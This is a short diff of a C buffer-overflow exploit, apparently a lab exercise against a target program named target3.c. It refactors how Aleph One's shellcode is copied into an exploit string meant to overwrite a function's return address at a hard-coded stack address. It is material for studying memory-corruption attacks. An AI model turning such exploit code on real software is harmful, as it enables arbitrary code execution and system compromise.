@@ -37,7 +37,6 @@ int main(void)
                                    the return address of foo. */
   long buffAddr, *addrPtr;
   char egg[EGG_SIZE]; /* string containing exploit code */
-  char *ptr;
   int i;
 
   buffAddr = 0xBFFF61C8; /* start address of buf in target3.c:foo */
@@ -54,9 +53,7 @@ int main(void)
   	
   /* Then fill the next bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = &egg[strlen (magic)];
-  for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
+  memcpy (egg + strlen (magic), shellcode, strlen (shellcode));
 
   egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
 
